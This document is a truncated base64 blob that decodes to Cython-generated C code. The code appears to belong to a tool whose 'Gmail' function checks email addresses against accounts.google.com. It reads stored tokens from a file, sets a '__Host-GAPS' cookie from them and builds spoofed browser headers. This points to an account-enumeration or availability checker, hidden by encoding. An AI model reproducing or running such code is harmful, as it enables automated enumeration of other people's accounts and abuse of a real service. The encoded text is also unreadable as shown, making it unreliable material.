TsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yb3BfMTBHbWFpbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCkge1xuICBQeU9iamVjdCAqX19weXhfdl9vID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfY29va2llcyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9wYXJhbXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9vayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZ2cgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIGludCBfX3B5eF90XzQ7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfMTM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMTcpKFB5T2JqZWN0ICopO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHbWFpbCIsIDApO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdl9lbWFpbCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEwLCBfX3B5eF92X2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNCA8IDApKSkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19weXhfdF80KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdl9lbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfU3BsaXQoKChQeU9iamVjdCopX19weXhfdF81KSwgX19QeXhfTm9uZUFzTnVsbChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMCksIC0xTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDI4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfR2V0SXRlbUludF9MaXN0KF9fcHl4X3RfNiwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI4NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2VtYWlsLCBfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF9idWlsdGluX29wZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTI7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVhZCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF82ID0gX19weXhfdF8xMDtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdGxpbmVzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI5MCwgX19weXhfTDEwX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfNSwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdl9vID0gX19weXhfdF8xMDtcbiAgICAgICAgICBfX3B5eF90XzEwID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDE1X3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0wxMF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuR21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEwLCAmX19weXhfdF81LCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMjkyLCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX3B5eF90XzE1ID0gX19weXhfdF8xNjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTUsIE5VTEx9O1xuICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDI5MiwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXRsaW5lcywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAyOTIsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfMTIsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMjkyLCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfbywgX19weXhfdF8xNCk7XG4gICAgICAgICAgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpO1xuICAgICAgICBfX3B5eF9MMTVfdHJ5X2VuZDo7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19weXhfdl9vO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fN307XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyOTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIH1cbiAgICAgIGlmICgobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzYpKSkgfHwgKFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfNikpKSB7XG4gICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNjtcbiAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgIT0gMikpIHtcbiAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpO1xuICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgIF9fUFlYX0VSUigwLCAyOTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICB9XG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChzZXF1ZW5jZSkpKSB7XG4gICAgICAgICAgX19weXhfdF81ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xO1xuICAgICAgICBfX3B5eF90XzE0ID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19weXhfdF8xNyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMTQpO1xuICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMTcoX19weXhfdF8xNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MMThfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIGluZGV4ID0gMTsgX19weXhfdF8xMCA9IF9fcHl4X3RfMTcoX19weXhfdF8xNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIGdvdG8gX19weXhfTDE4X3VucGFja2luZ19mYWlsZWQ7XG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzE0KSwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyOTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMTlfdW5wYWNraW5nX2RvbmU7XG4gICAgICAgIF9fcHl4X0wxOF91bnBhY2tpbmdfZmFpbGVkOjtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7XG4gICAgICAgIGlmIChfX1B5eF9JdGVyRmluaXNoKCkgPT0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKGluZGV4KTtcbiAgICAgICAgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fcHl4X0wxOV91bnBhY2tpbmdfZG9uZTo7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3RsID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3ZfaG9zdCA9IF9fcHl4X3RfMTA7XG4gICAgICBfX3B5eF90XzEwID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDI5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjk3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X